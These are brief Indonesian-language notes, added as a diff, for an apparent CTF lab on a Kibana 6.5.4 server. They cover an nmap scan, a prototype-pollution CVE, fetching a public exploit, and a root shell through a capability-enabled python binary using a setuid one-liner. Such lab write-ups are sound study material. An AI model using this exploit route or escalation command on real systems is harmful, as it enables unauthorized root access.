@@ -1,0 +1,24 @@
+- cek nmap -p- 
+- port 5601 kibana buka aja di browser port itu buat kibana nya
+- 
+
+1. What is the vulnerability that is specific to programming languages with prototype-based inheritance?
+- Prototype pollution, hasil searching
+
+2. What is the version of visualization dashboard installed in the server?
+- cek di devtools, req GET / aja, nanti di bagian version elasticsearch ada
+
+3. What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
+- cari aja di google: cve prototype pollution kibana 6.5.4     
+
+4. Compromise the machine and locate user.txt 
+- cek di google cve nya tulis exploit, cve exploit github, wget aja
+- pake aja, find / -type f -name user.txt 2>/dev/null, nanti dapet cat aja
+
+5. How would you recursively list all of these capabilities? :
+- copas pertanyaan nya ke gpt nanti dia jawab getcap -r, buat recursive semua cap
+
+6. root.txt :
+> getcap -r / 2>/dev/null
+> ada tuh python di home, /home/kiba/.hackmeplease/python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
+> klaim root 
